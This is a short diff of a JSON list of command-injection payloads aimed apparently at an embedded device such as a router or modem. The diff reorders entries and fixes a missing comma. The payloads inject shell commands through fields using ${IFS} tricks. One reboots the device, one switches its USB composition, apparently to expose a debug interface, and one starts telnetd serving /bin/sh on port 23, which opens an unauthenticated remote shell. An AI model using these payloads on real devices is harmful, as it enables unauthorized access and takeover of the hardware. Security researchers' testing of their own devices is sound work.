@@ -9,12 +9,12 @@
       "description": "reboot device injection 2 "
     },
     {
-      "payload": ";/sbin/usb_composition 9025;#",
-      "description": "52540: usb_composition 9025"
-    }
-    {
       "payload": "$(/bin/systemctl${IFS}reboot)",
       "description": "reboot device injection 3"
+    },
+    {
+      "payload": ";/sbin/usb_composition 9025;#",
+      "description": "52540: usb_composition 9025"
     },
     {
       "payload": "Aa1$(telnetd${IFS}-l${IFS}/bin/sh${IFS}-p${IFS}23)",
